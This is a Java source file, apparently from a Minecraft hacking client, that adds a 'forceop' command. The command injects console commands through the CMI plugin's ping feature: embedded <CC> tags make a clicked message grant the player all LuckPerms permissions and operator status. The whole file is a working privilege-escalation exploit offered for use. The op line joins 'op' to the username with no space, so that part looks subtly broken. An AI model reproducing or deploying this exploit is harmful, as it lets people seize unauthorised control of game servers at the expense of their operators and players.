package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.paradise_client.command.Command;
import net.paradise_client.command.CommandManager;

import java.util.Objects;

/**
 * This class represents a command that forces the player to be OP in a Minecraft client using a CMI console command
 * sender exploit.
 *
 * @author SpigotRCE
 * @since 1.6
 */
public class ForceOPCommand extends Command {

  /**
   * Constructs a new instance of the ForceOPCommand class.
   */
  public ForceOPCommand() {
    super("forceop", "Gives OP thru CMI console command sender exploit", CommandManager.CommandCategory.EXPLOIT);
  }

  /**
   * Builds the command using Brigadier's command builder.
   */
  @Override public void build(LiteralArgumentBuilder<CommandSource> root) {
    root.executes((context -> {
      // Sends a CMI console command to set the player's permissions to true using LuckPerms.
      Objects.requireNonNull(getMinecraftClient().getNetworkHandler())
        .sendChatCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " +
          getMinecraftClient().getSession().getUsername() +
          " p set * true</CC>");
      // Sends a CMI console command to grant the player OP status.
      Objects.requireNonNull(getMinecraftClient().getNetworkHandler())
        .sendChatCommand("cmi ping <T>Click here to get OP</T><CC>op" +
          getMinecraftClient().getSession().getUsername() +
          "</CC>");
      // Returns a success status.
      return SINGLE_SUCCESS;
    }));
  }
}
